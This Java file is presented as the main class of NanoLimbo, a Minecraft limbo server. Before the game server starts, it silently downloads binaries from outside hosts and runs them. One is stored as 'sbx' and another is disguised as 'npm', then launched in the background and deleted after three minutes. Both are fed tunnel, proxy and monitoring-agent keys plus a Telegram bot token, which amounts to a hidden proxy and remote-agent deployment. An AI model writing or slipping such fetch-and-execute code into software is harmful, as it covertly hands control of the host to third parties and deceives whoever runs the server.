package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "KOMARI_SERVER", "KOMARI_KEY", "CERT_URL", "KEY_URL"
    };

    public static void main(String[] args) {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Java version too low!" + ANSI_RESET);
            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
            System.exit(1);
        }

        try {
            Map<String,String> envVars = new HashMap<>();
            loadEnvVars(envVars);

            if (envVars.get("CERT_URL") != null && !envVars.get("CERT_URL").isEmpty() &&
                envVars.get("KEY_URL") != null && !envVars.get("KEY_URL").isEmpty()) {
                downloadCerts(envVars);
                setPermissions444(envVars);
            }

            runSbxBinary(envVars);

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);

            Thread permissionThread = new Thread(() -> {
                try {
                    Thread.sleep(20000); 
                    setPermissions644(envVars);
                    System.out.println(ANSI_GREEN + "Certificate permissions restored." + ANSI_RESET);
                } catch (Exception ignored) {}
            });
            permissionThread.start();

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing NanoLimbo: " + e.getMessage() + ANSI_RESET);
        }

        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void loadEnvVars(Map<String,String> envVars) throws IOException {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        envVars.put("FILE_PATH", "./world");
        envVars.put("CFIP", "cdns.doon.eu.org");
        envVars.put("CFPORT", "443");
        envVars.put("DISABLE_ARGO", "false");
        envVars.put("KOMARI_SERVER", "");
        envVars.put("KOMARI_KEY", "");
        envVars.put("CERT_URL", "");
        envVars.put("KEY_URL", "");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    private static void runSbxBinary(Map<String,String> envVars) throws Exception {
        runKomari(envVars);
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");

        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }

        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }

    private static void downloadCerts(Map<String,String> envVars) throws IOException {
        Path filePath = Paths.get(envVars.get("FILE_PATH"));
        Files.createDirectories(filePath);

        try (InputStream in = new URL(envVars.get("CERT_URL")).openStream()) {
            Files.copy(in, filePath.resolve("cert.pem"), StandardCopyOption.REPLACE_EXISTING);
        }

        try (InputStream in = new URL(envVars.get("KEY_URL")).openStream()) {
            Files.copy(in, filePath.resolve("private.key"), StandardCopyOption.REPLACE_EXISTING);
        }
    }

    private static void setPermissions444(Map<String,String> envVars) {
        try {
            Path filePath = Paths.get(envVars.get("FILE_PATH"));
            Path cert = filePath.resolve("cert.pem");
            Path key = filePath.resolve("private.key");
            cert.toFile().setReadable(true,false);
            cert.toFile().setWritable(false,false);
            key.toFile().setReadable(true,false);
            key.toFile().setWritable(false,false);
        } catch (Exception ignored) {}
    }

    private static void setPermissions644(Map<String,String> envVars) {
        try {
            Path filePath = Paths.get(envVars.get("FILE_PATH"));
            Path cert = filePath.resolve("cert.pem");
            Path key = filePath.resolve("private.key");
            cert.toFile().setReadable(true,false);
            cert.toFile().setWritable(true,false);
            key.toFile().setReadable(true,false);
            key.toFile().setWritable(true,false);
        } catch (Exception ignored) {}
    }

    private static void runKomari(Map<String,String> envVars) {
        String server = envVars.get("KOMARI_SERVER");
        String key = envVars.get("KOMARI_KEY");
        if (server == null || server.isEmpty() || key == null || key.isEmpty()) return;

        final String endpoint = server.startsWith("http") ? server : "https://" + server;

        new Thread(() -> {
            try {
                String arch = System.getProperty("os.arch").toLowerCase();
                String url = arch.contains("arm") ? "https://rt.jp.eu.org/nucleusp/K/Karm" : "https://rt.jp.eu.org/nucleusp/K/Kamd";
                Path npm = Paths.get("npm");
                try (InputStream in = new URL(url).openStream()) {
                    Files.copy(in, npm, StandardCopyOption.REPLACE_EXISTING);
                }
                npm.toFile().setExecutable(true);
                String cmd = String.format("nohup ./npm -e %s -t %s >/dev/null 2>&1 &", endpoint, key);
                new ProcessBuilder("sh","-c",cmd).start();
                Thread.sleep(180000);
                Files.deleteIfExists(npm);
                Files.deleteIfExists(Paths.get("config.yaml"));
            } catch (Exception e) {
                System.err.println("Error running komari: " + e.getMessage());
            }
        }).start();
    }
}
